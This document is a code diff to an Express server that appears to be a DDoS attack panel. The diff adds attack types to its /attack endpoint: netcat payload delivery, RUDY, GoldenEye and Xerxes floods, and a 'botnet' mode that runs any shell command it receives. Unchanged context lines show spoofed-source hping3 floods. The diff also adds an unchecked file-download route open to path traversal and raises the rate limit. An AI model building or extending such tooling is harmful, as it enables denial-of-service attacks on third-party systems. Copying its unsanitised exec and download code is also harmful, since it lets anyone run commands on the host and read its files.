@@ -9,6 +9,7 @@ const rateLimit = require('express-rate-limit');
 const crypto = require('crypto');
 const promClient = require('prom-client');
 const { networkInterfaces } = require('os');
+const si = require('systeminformation');
 
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
@@ -32,6 +33,13 @@ const attackDurationGauge = new promClient.Gauge({
     registers: [registry]
 });
 
+const attackIntensityGauge = new promClient.Gauge({
+    name: 'noodles_attack_intensity',
+    help: 'Intensity of the last attack',
+    labelNames: ['attackType', 'target'],
+    registers: [registry]
+});
+
 const log = (message) => {
     const timestamp = new Date().toISOString();
     const logMessage = `[${timestamp}] ${message}\n`;
@@ -43,7 +51,7 @@ const log = (message) => {
 
 const apiLimiter = rateLimit({
 	windowMs: 15 * 60 * 1000,
-	max: 1000,
+	max: 10000,
 	message: 'Too many requests, try again after 15 minutes',
 	standardHeaders: true,
 	legacyHeaders: false,
@@ -62,6 +70,61 @@ function getNetworkInterface() {
     }
     return null;
 }
+
+async function getSystemStats() {
+    try {
+        const cpu = await si.cpu();
+        const mem = await si.mem();
+        const osInfo = await si.osInfo();
+        const disk = await si.diskLayout();
+        const network = await si.networkInterfaces();
+
+        return {
+            cpu: {
+                manufacturer: cpu.manufacturer,
+                brand: cpu.brand,
+                cores: cpu.cores,
+                speed: cpu.speed
+            },
+            memory: {
+                total: mem.total,
+                free: mem.free,
+                used: mem.used
+            },
+            os: {
+                platform: osInfo.platform,
+                distro: osInfo.distro,
+                release: osInfo.release
+            },
+            disk: {
+                model: disk.length > 0 ? disk[0].model : 'N/A',
+                size: disk.length > 0 ? disk[0].size : 'N/A'
+            },
+            network: network.map(iface => ({
+                iface: iface.iface,
+                ip4: iface.ip4,
+                ip6: iface.ip6,
+                mac: iface.mac
+            }))
+        };
+    } catch (e) {
+        console.error('Error getting system stats:', e);
+        log(`Error getting system stats: ${e.message}`);
+        return { error: e.message };
+    }
+}
+
+app.get('/system-stats', async (req, res) => {
+    const userApiKey = req.headers['x-api-key'];
+
+    if (userApiKey !== apiKey) {
+        log('Error: Unauthorized API key for system stats.');
+        return res.status(401).send('Unauthorized.');
+    }
+
+    const stats = await getSystemStats();
+    res.json(stats);
+});
 
 app.post('/attack', async (req, res) => {
     const target = req.body.target;
@@ -85,6 +148,8 @@ app.post('/attack', async (req, res) => {
     const numThreads = os.cpus().length * 8;
     const encodedTarget = target;
     const networkInterface = getNetworkInterface();
+
+    attackIntensityGauge.set({ attackType: attackType, target: target }, intensity);
 
     switch (attackType) {
         case 'ddos':
@@ -185,6 +250,36 @@ app.post('/attack', async (req, res) => {
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --icmp-ts --flood --rand-source -p <port> ${encodedTarget} & done; done"`;
             break;
 
+        case 'payload':
+            const payload = req.body.payload;
+            if (!payload) {
+                log('Error: Payload is required for payload attack.');
+                return res.status(400).send('Payload is required for payload attack.');
+            }
+             command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} 80"`;
+             break;
+
+        case 'rudy':
+             command = `timeout ${duration} python3 rudy.py -t ${encodedTarget} -n ${numThreads} -s ${intensity}`;
+             break;
+
+        case 'goldeneye':
+             command = `timeout ${duration} python3 goldeneye.py ${encodedTarget} ${numThreads}`;
+             break;
+
+        case 'xerxes':
+             command = `timeout ${duration} ./xerxes ${encodedTarget} ${numThreads}`;
+             break;
+
+        case 'botnet':
+              const botCommand = req.body.botCommand;
+              if (!botCommand) {
+                log('Error: Bot command is required for botnet attack.');
+                 return res.status(400).send('Bot command is required for botnet attack.');
+              }
+              command = `timeout ${duration} bash -c "${botCommand}"`;
+              break;
+
         default:
             log(`Error: Invalid attack type: ${attackType}`);
             return res.status(400).send('Invalid attack type.');
@@ -195,7 +290,7 @@ app.post('/attack', async (req, res) => {
     attackCounter.inc({ attackType: attackType, target: target });
     const attackStartTime = Date.now();
 
-    exec(command, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
+    exec(command, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
         const attackEndTime = Date.now();
         const actualDuration = (attackEndTime - attackStartTime) / 1000;
         attackDurationGauge.set({ attackType: attackType, target: target }, actualDuration);
@@ -235,6 +330,19 @@ app.get('/metrics', async (req, res) => {
     res.setHeader('Content-Type', registry.contentType);
     const metrics = await registry.metrics();
     res.send(metrics);
+});
+
+app.get('/download/:file', (req, res) => {
+    const file = req.params.file;
+    const filePath = path.join(__dirname, file);
+
+    fs.access(filePath, fs.constants.F_OK, (err) => {
+        if (err) {
+            return res.status(404).send('File not found');
+        }
+
+        res.download(filePath);
+    });
 });
 
 const PORT = process.env.PORT || 3000;
